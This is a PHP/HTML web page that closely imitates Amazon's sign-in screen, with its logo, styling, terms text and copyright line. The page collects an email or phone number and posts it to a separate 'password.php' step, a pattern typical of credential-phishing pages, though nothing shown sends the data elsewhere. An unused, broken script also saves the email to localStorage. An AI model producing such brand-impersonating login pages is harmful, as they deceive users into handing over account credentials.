<?php
$email = $_POST['email'] ?? '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>

<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #ffffff;
    }

.logo-container {
    text-align: center;
    margin-top: 10px;
    margin-bottom: 0;
}

    .logo-container img {
        width: 100px;
    }

    .container {
        text-align: center;
        padding-top: 5px;
        margin-top: 0; /* remove extra space */
    }

    .login-box {
        background: #fff;
        width: 300px;
        margin: 0 auto;
        padding: 20px 26px;
        border: 1px solid #ddd;
        border-radius: 8px;
        text-align: left;
    }

    .login-box h1 {
        font-size: 20px;
        font-weight: 400;
        margin-bottom: 20px;
    }

    label {
        font-size: 14px;
        font-weight: 700;
    }

    input {
        width: 100%;
        padding: 8px;
        margin-top: 5px;
        margin-bottom: 15px;
        border: 1px solid #a6a6a6;
        border-radius: 4px;
        font-size: 14px;
    }

    .btn {
        width: 100%;
        background: #FFD814;
        border: 1px solid #FCD200;
        padding: 8px;
        border-radius: 20px;
        font-size: 14px;
        cursor: pointer;
    }

    .btn:hover {
        background: #F7CA00;
    }

    .small-text {
        font-size: 13.5px;
        margin-top: 15px;
        line-height: 1.5;
    }

    .small-text a {
        color: #0066c0;
        text-decoration: none;
    }

    .small-text a:hover {
        text-decoration: underline;
    }

    .divider {
        margin: 20px 0;
        border-top: 1px solid #ddd;
    }

    .footer-links {
        text-align: center;
        margin-top: 40px;
        font-size: 12px;
        color: #555;
    }

    .footer-links a {
        margin: 0 10px;
        color: #0066c0;
        text-decoration: none;
    }

    .footer-links a:hover {
        text-decoration: underline;
    }

    .copyright {
        margin-top: 10px;
    }

    .footer-divider {
        margin-top: 40px;
        border: none;
        border-top: 1px solid #ddd;
    }
</style>
</head>
<body>

<div class="logo-container">
    <img src="Amazon_logo.svg.webp" alt="Logo">
</div>

<div class="container">

    <div class="login-box">
        <h1>Sign in or create account</h1>

        <!-- FORM START -->
        <form action="password.php" method="POST">
            <label>Enter mobile number or email</label>
            <input type="text" name="email" required>

            <button type="submit" class="btn">Continue</button>
        </form>
        <!-- FORM END -->

        <div class="small-text">
            By continuing, you agree to Amazon's 
            <a href="#">Conditions of Use</a> and 
            <a href="#">Privacy Notice</a>.
        </div>

        <div class="small-text" style="margin-top:10px;">
            <a href="#">Need help?</a>
        </div>

        <div class="divider"></div>

        <div class="small-text">
            <strong>Buying for work?</strong><br>
            <a href="#">Create a free business account</a>
        </div>
    </div>

    <hr class="footer-divider">

    <div class="footer-links">
        <a href="#">Conditions of Use</a>
        <a href="#">Privacy Notice</a>
        <a href="#">Help</a>

        <div class="copyright">
            © 1996–2026, Amazon.com, Inc. or its affiliates
        </div>
    </div>

</div>
<script>
function saveEmail() {
    const email = document.getElementById("email").value;
    localStorage.setItem("mumshoppingUserEmail", email);
}
</script>

</body>
</html>
